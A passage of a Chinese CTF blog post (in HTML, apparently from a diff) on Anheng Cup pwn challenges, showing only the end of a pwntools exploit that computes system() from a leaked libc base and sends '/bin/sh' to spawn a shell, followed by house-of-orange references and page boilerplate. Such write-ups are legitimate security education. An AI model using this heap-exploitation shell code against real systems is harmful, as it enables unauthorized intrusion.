offset_puts</span><br><span class="line">system_addr = libc_base + offset_system</span><br><span class="line">log.success(&apos;system addr : 0x%x&apos;%system_addr)</span><br><span class="line"></span><br><span class="line">#system(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>house of orange相关文章：</p>
+<ul>
+<li><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li>
+<li><a href="https://bbs.pediy.com/thread-222718.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222718.htm</a></li>
+<li><a href="http://tacxingxing.com/2018/01/10/house-of-orange/" target="_blank" rel="noopener">http://tacxingxing.com/2018/01/10/house-of-orange/</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    D4rk3r
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2018/12/26/安恒杯12月月赛-pwn/" title="安恒杯12月月赛 (pwn)">http://yoursite.com/2018/12/26/安恒杯12月月赛-pwn/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" <i class="fa fa-tag"></i> pwn</a>
+          
+            <a href="/tags/ctf/" <i class="fa fa-tag"></i> ctf</a>
+          
+            <a href="/tags/house-of-orange/" <i class="fa fa-tag"></i> house of orange</a>
+          
+            <a href="/tags/unsorted-bin-attack/" <i class="fa fa-tag"></i> unsorted bin attack</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/11/XSS挑战之旅-游戏闯关/" rel="next" title="XSS挑战之旅--游戏闯关">
+                <i class="fa fa-chevron-left"></i> XSS挑战之旅--游戏闯关
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.jpg"
+                alt="D4rk3r" />
+            
+              <p class="site-author-name" itemprop="name">D4rk3r</p>
+              <p class="site-description motion-element" itemprop="description">Impossible -> I'm possible</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/hacker-mao" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:hacker_mao@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-globe"></i>简书</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目链接"><span class="nav-number">1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#messageb0x"><span class="nav-number">2.</span> <span class="nav-text">messageb0x</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#smallorange"><span class="nav-number">3.</span> <span class="nav-text">smallorange</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D4rk3r</span>
+
+  
+</div>
+
+
+<span id="busuanzi_container_site_pv">本站访客数:<span id="busuanzi_value_site_uv"></span></span>
+
+
+
+
+<div class="powered-by">
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共49.8k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'P8YQNN3bnD7UXTifnqgfGuuQ-gzGzoHsz',
+        appKey: '5zQS6AJMU15VfzcEXr0cw0cr',
+        placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("P8YQNN3bnD7UXTifnqgfGuuQ-gzGzoHsz", "5zQS6AJMU15VfzcEXr0cw0cr");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
